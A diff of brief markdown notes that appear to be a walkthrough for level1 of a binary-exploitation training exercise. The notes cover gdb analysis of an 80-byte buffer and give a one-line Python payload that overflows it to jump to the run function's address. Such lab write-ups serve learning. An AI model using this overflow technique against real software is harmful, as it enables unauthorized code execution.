@@ -1,13 +1,13 @@
 
-- Like level0, gdb level1, info functions and see a main and run
+- Like level0, `gdb level1`, info functions and see a main and run
 
-- Disas main and run and we see main function call run
+- `disas main` and run and we see main function call run
 
 - And run function do a sys call
 
 - We see buffer of $0x50 bytes = 80 in main function
 
-- We need to overflow the buffer in the main and go to 0x08048444 (run address)
+- We need to overflow the buffer in the main and go to 0x08048444 (run's address)
 
 - Create and exec a payload: python -c "print 'a' * 76 + '\x44\x84\x04\x08'" > /tmp/payload && cat /tmp/payload - | ./level1
 
